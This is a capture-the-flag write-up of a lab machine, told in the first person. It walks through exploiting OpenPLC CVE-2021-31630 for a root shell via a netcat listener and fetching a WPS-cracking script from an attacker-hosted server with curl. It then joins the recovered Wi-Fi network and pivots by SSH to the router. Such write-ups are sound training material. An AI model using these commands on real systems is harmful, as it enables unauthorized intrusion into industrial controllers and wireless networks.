Probably the easiest user flag I’ve gotten so far. The lab will begin with an nmap scan to the IP address, which reveals a ssh port and a web browser port. Connecting to the website we find that it’s an OpenPLC login page. Googling vulnerabilities for this report we find that cve-2021-31630 exists, which is an authenticated remote code execution issue. Luckily for us, scripts online exist that allow us to authenticate as root immediately. Running “nc -lvp 1234” then running the python script will give us access inside the server as root. From here we can cat user.txt and get our first flag. Now it gets a bit trickier: we need to move laterally within the network. Begin by typing “ip addr show” to show all available network interfaces. When we do so, we find a wlan network. A quick call to “iw dev wlan0 scan” will show us information about this network. The SSID is “plcrouter” and the encryption is, luckily, WPS. It’s currently running WPS version 1.0. So ok, we have the interface we want to attack with WPS, but the main issue here is that we cannot get anything installed on the victim machine. Any calls to git clone are met with issues, and so it’s becoming a bit tricky. In this instance, we have to download the code onto our attacking machine and then transfer the file over to the victim through the use of a http server. We can use “python -m http.server 4444” on our attacking machine to set up a server. From here, just use “curl [attacker ip]/oneshot.py > oneshot.py” to download the file to your machine. Once this is complete, we find that the WPS pin is “12345670”, the PSK is “NoWWEDoKnowWhaTisReal123!”. So now we need to connect to this new wlan0 interface. In order to do so from the command line, we need to use a new command I haven’t heard of called “wpa_passphrase” and “wpa_supplicant”. The first command will create a PSK for network configuration, and the second one will help us to connect. Use the commands in the format of:

“wpa_passphrase [SSID] ‘[PSK]’ > /tmp/config” 
“wpa_supplicant -B -c /tmp/config -i [interface (wlan0)]” 

to get this setup. Once we’re on the network, we need to assign ourselves an IP address. Use the command  “ifconfig [interface] [192.168.1.x] netmask [255.255.255.0]” to set an IP address on this interface. I’ve chosen 192.168.1.15, as 15 is my favorite number. If x.x.x.15 is ever occupied, you may need to choose another address. So this took some looking into, as nmap was not easily installed on this victim machine. Apparently, 192.168.1.1 is the access point we’re meant to connect to. This is the default router IP address on the 192.168.1.0 network. With this in mind, we can attempt to ssh into this host. Another error is encountered here, though, as the terminal fails to connect, giving an issue with stdin and host key verification as the cause. For this reason, we open up a shell within this connection using a python script: “python3 -c 'import pty; pty.spawn("/bin/sh")'. Once this is done, we can ssh into the x.x.1.1 IP address and search for the root in /root.
